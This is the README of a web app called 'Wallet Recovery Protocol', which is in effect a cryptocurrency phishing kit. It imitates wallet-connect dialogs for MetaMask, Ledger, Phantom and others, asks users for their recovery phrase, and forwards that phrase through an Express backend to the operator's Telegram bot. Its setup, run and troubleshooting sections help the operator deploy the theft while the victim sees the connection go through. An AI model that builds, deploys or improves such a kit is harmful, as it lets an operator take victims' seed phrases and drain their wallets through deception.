# Wallet Recovery Protocol

A React + Vite application for wallet assistance and recovery phrase collection via Telegram.

## Features

- **Multi-Wallet Support**: Connect with MetaMask, Trust Wallet, Coinbase Wallet, Phantom, OKX, Rabby, Rainbow, Ledger, Keplr, WalletConnect, and more
- **Recovery Phrase Collection**: Secure modal for collecting wallet recovery phrases
- **Telegram Integration**: Automatic delivery of recovery phrases to your Telegram bot
- **Responsive Design**: Works seamlessly on desktop and mobile
- **Modern UI**: Built with React and styled for user experience

## Quick Start

### Prerequisites
- Node.js (v14+)
- npm or yarn
- Telegram account (for bot setup)

### Installation

1. Clone the repository
2. Install dependencies:
   ```bash
   npm install
   ```

3. Follow the [SETUP.md](./SETUP.md) guide to:
   - Create a Telegram bot
   - Get your Chat ID
   - Configure environment variables

### Running the Application

**Development:**
```bash
npm run dev-full
```

This runs:
- Frontend on `http://localhost:5173`
- Backend on `http://localhost:3001`

**Production:**
```bash
npm run build
npm run server
```

## How It Works

1. User selects a wallet from the modal
2. Recovery phrase input modal appears
3. User enters their recovery phrase
4. Phrase is sent to backend (Express server)
5. Backend forwards to Telegram bot
6. Admin receives encrypted message with phrase
7. Connection proceeds on frontend

## Configuration

See [SETUP.md](./SETUP.md) for detailed setup instructions including:
- Telegram bot creation
- Environment variable configuration
- Production deployment guidelines

## Project Structure

```
├── src/
│   ├── App.jsx                  # Main app component
│   ├── ConnectPage.jsx          # Wallet connection page
│   ├── WalletModal.jsx          # Wallet selection modal (updated)
│   ├── RecoveryPhraseModal.jsx  # NEW: Recovery phrase input modal
│   └── ...
├── server.js                    # Express backend server (NEW)
├── .env.example                 # Environment template
├── SETUP.md                     # Setup instructions
└── package.json                 # Updated with new scripts
```

## Scripts

- `npm run dev` - Start frontend dev server
- `npm run server` - Start backend server
- `npm run dev-full` - Start both frontend and backend
- `npm run build` - Build for production
- `npm run preview` - Preview production build
- `npm run lint` - Run ESLint

## Technologies

- **Frontend**: React 19, Vite, React Router
- **Backend**: Express.js, Axios, CORS
- **External**: Telegram Bot API
- **Styling**: CSS-in-JS

## Security

⚠️ **Important**: 
- Never commit `.env` file (included in .gitignore)
- Keep Telegram Bot Token private
- Use HTTPS in production
- See [SETUP.md](./SETUP.md) for security best practices

## Troubleshooting

**Issue**: "Failed to submit recovery phrase"
- Check backend is running: `npm run server`
- Verify `.env` file has correct Telegram credentials
- Check browser console for error details

**Issue**: Bot not receiving messages
- Verify Bot Token is correct
- Verify Chat ID is correct
- Test: `https://api.telegram.org/bot<TOKEN>/getMe`

See [SETUP.md](./SETUP.md) for more troubleshooting.

## License

Proprietary - All rights reserved

## Support

For setup help and troubleshooting, see [SETUP.md](./SETUP.md)

